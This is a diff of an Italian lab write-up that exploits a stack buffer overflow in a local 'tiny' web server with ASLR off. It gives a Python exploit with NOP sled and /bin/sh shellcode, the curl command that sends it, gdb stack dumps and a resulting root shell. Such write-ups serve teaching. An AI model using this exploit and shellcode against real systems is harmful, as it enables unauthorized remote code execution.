@@ -1,6 +1,6 @@
 # Writeup - stack-buffer-overflow - lab1
 
-Tecniche di exploiting base di vulnerabilità Stack Buffer Overflow.
+Tecniche di exploiting base di vulnerabilità Stack Buffer Overflow like 1996.
 
 ```
 root@283bf557ebdc:/opt# execnoaslr gdb tiny-lab1
@@ -284,11 +284,11 @@ PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + OVERWRITE_EIP_WI
 
 ### Identificare Return Address
 
-Per identificare il corretto `SHELLCODE Address` da usare per sovrascrivere il registro `EIP` si può effettuare il fuzzing con un valore base come `BBBB` e identificare nello stack gli indirizzi di memoria contenenti i NOP codes `x90`. Tale tecnica funziona perchè ASLR risulta disabilitato, fosse abilitato tale indirizzo risulterebbe randomcizzato e quindi ogni esecuzione sarebbe differente rendendo impossibile la predicibilità.
+Il corretto `SHELLCODE Address` da usare per sovrascrivere il registro `EIP` verrà scelto tra i valori identificati nello stack contenenti  valori di NOP codes `x90` sfruttando la tenica di `NOP sleed`. 
 
 Tramite il seguente exploit contenente `0x42424242` come indirizzo da sovrascrivere RET address possiamo effettuare l'analisi:
 
-exploit_lab1.py
+exploit.py
 ```
 import struct
 import urllib
@@ -300,98 +300,144 @@ NOP_SIZE = 100
 PADDING = "\x41"
 PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
 EIP = struct.pack("I", 0x42424242)
-PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
+PAYLOAD = PADDING*PADDING_SIZE + NOP*NOP_SIZE + SHELLCODE + EIP
 print urllib.quote_plus(PAYLOAD)
 ```
-Effettuando debug tramite gdb come segue:
+
+Eseguito nel seguente modo:
 ```
-(gdb) r
-Starting program: /home/rhpco/sandbox/addresssanitizer/tiny-web-server/lab1/tiny-lab1 
-listen on port 9999, fd is 3
-child pid is 8194
+$ curl http://localhost:9999/`python exploit.py`
 
 ```
-E successivamente lanciare l'exploit:
+Verso il server eseguito in tramite gdb come segue:
 ```
-$ curl http://localhost:9999/`python exploit_lab1.py`
-
-```
-Otteniamo il crash atteso e possiamo effettuare l'analisi dello stack alla ricerco di zone contenenti `NOP Codes` relativi il `NOP Sleed` iniettato, cioè la zona contenente 100 `x90` nello stack:
-```
-File not found127.0.0.1:50760 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������1�Ph//shh/bin��P��S���
-                                   ��������������������������������������������������BBBB
-
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-(gdb) 
-(gdb) x/600x $esp-600
-0xffffc918:	0x00000000	0x00000000	0x00000000	0x00000000
-0xffffc928:	0x00000000	0x00000000	0x00000000	0x00000000
-0xffffc938:	0x00000000	0x00000000	0x00000000	0x00000000
-0xffffc948:	0x00000000	0x00000000	0x00000000	0x00000000
-0xffffc958:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffc968:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffc978:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffc988:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffc998:	0x41414141	0x41414141	0x41414141	0x41414141
+root@283bf557ebdc:/opt# execnoaslr gdb tiny-lab1
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
 [...]
-0xffffcac8:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffcad8:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffcae8:	0x41414141	0x90414141	0x90909090	0x90909090
-0xffffcaf8:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffcb08:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffcb18:	0x90909090	0x90909090	0x50c03190	0x732f2f68
-0xffffcb28:	0x622f6868	0xe3896e69	0x53e28950	0x0bb0e189
-0xffffcb38:	0x909080cd	0x90909090	0x90909090	0x90909090
-0xffffcb48:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffcb58:	0x90909090	0x90909090	
+gdb-peda$ r
+Starting program: /opt/tiny-lab1
+listen on port 9999, fd is 3
+child pid is 185
+[New process 185]
+accept request, fd is 4, pid is 181
+HTTP/1.1 404 Not found
+Content-length: 14
+
+File not found172.17.0.1:34438 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S��
+[...]
+[----------------------------------registers-----------------------------------]
+EAX: 0x228
+EBX: 0x0
+ECX: 0x1
+EDX: 0xf7fc3890 --> 0x0
+ESI: 0xf7fc2000 --> 0x1d4d6c
+EDI: 0x0
+EBP: 0x80cd0bb0
+ESP: 0xffffd600 --> 0x0
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd600 --> 0x0
+0004| 0xffffd604 --> 0xffffd750 --> 0x8a860002
+0008| 0xffffd608 --> 0xffffd63c --> 0x10
+0012| 0xffffd60c --> 0xf7ffdc44 --> 0xf7ffdc30 --> 0xf7fd4000 (jg     0xf7fd4047)
+0016| 0xffffd610 --> 0x380
+0020| 0xffffd614 --> 0x8048581 ("__libc_start_main")
+0024| 0xffffd618 --> 0x380
+0028| 0xffffd61c --> 0x380
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
 ```
 
-Ecco che al termine del padding tramite `A (x41)` abbiamo i `NOP Codes` a partire da 
-```0xffffcae8:	0x41414141	0x90414141	0x90909090	0x90909090```
-e successivamente lo shellcode e poi nuovamente alcuni nop codes proprio come atteso dall'exploit proposto.
-A questo punto risulta evidente come possiamo scegliere un indirizzo dello stack qualsiasi di questa prima zona di `NOP Codes` come ad esempio `0xffffcaf8`. 
-Questo sarà il valore che useremo per effettuare overwrite del `EIP`, jampare in quella zona di `NOP sleed` e sucessivamente scivolare fino l'esecuzione dello shellcode iniettato.
+Analizzando lo stack a seguito del crash atteso si verifica la presenza dei bytes di padding contenente `A (0x41)`, successivamente il `NOP sleed` che inizia dal seguente indirizzo `0xffffd57c`:
+```
+gdb-peda$ x/x 0xffffd578+4
+0xffffd57c:     0x90414141
+```
+Dallo stack completo si nota il valore `0x42424242` sovrascritto nell'indirizzo `0xffffd5f8+4` cioè `0xffffd5fc`, così calcolato:
+```
+gdb-peda$ x/x 0xffffd5f8+4
+0xffffd5fc:     0x42424242
+```
+Stack completo
+```
+gdb-peda$ x/200x $esp-200
+0xffffd538:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd548:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd558:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd568:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd578:     0x41414141      0x90414141      0x90909090      0x90909090
+0xffffd588:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd598:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5a8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5b8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5c8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd5d8:     0x90909090      0x90909090      0x31909090      0x2f6850c0
+0xffffd5e8:     0x6868732f      0x6e69622f      0x8950e389      0xe18953e2
+0xffffd5f8:     0x80cd0bb0      0x42424242      0x00000000      0xffffd750
+0xffffd608:     0xffffd63c      0xf7ffdc44      0x00000380      0x08048581
+0xffffd618:     0x00000380      0x00000380      0xf7fdf289   
+[..]
 
-Di seguito exploit aggiornato:
-exploit_lab1.py
+```
+
+A questo punto risulta evidente come possiamo scegliere un indirizzo dello stack qualsiasi di questa prima zona di `NOP Codes` come ad esempio `0xffffd588`. 
+Questo sarà il valore che useremo per effettuare overwrite del `EIP` nell'exploit, che iniziando l'esecuzione su l'indirizzo puntato da tale registro tornerà indietro fino l'inizio dello shellcode cioè dall'indirizzo `0xffffd5e3` calcolato come segue:
+```
+gdb-peda$ x/4b 0xffffd5d8+11
+0xffffd5e3:     0x31    0xc0    0x50    0x68
+```
+che rappresentano esattamente l'inizio dello shellcode iniettato:
+```
+SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+```
+Grazie allo scivolamento (sleed), cioè l'esecuzione di tutti i `NOP Codes` che si trovano tra l'indirizzo `0xffffd588` e `0xffffd5e3`
+
+Di seguito exploit aggiornato con indirizzo:
+
+exploit.py
 ```
 import struct
 import urllib
-SIZE = 532
+SIZE = 524
 SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 SHELLCODE_SIZE = 25
 NOP = "\x90"
 NOP_SIZE = 100
 PADDING = "\x41"
 PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
-EIP = struct.pack("I", 0xffffcaf8)
+EIP = struct.pack("I", 0xffffd5a4)
 PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
 print urllib.quote_plus(PAYLOAD)
+```
+(il secondo NOP sleed risulta utile nel seguente scenario ma non essenziale)
+Eseguito tramite:
+```
+curl http://localhost:9999/`python exploit.py`
+```
 
+Di seguito la dimostrazione finale della fase di exploiting
 ```
-E di seguito la dimostrazione del funzionamento:
-```
-curl http://localhost:9999/`python exploit_lab1.py`
-```
-
-Exploitation
-```
-./tiny-lab1 
+gdb-peda$ r
+Starting program: /opt/tiny-lab1
 listen on port 9999, fd is 3
-child pid is 9845
-accept request, fd is 4, pid is 9844
+[New process 248]
+child pid is 248
+accept request, fd is 4, pid is 247
 HTTP/1.1 404 Not found
 Content-length: 14
 
-File not found127.0.0.1:50842 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������1�Ph//shh/bin��P��S���
-                                   ������������������������������������������������������
-$ uname -a
-Linux darksun 4.15.0-47-generic #50-Ubuntu SMP Wed Mar 13 10:44:52 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
-$ 
+File not found172.17.0.1:34820 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������1�Ph//shh/bin��P��S��
+ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀������������������������������������������������������
+# uname -a
+Linux 283bf557ebdc 4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+#
 
 ```
-( notare che potrebber osserci differenze di offset tra run del codice vulnerabile attraverso `gdb` o meno)
 
 
 // rhpco
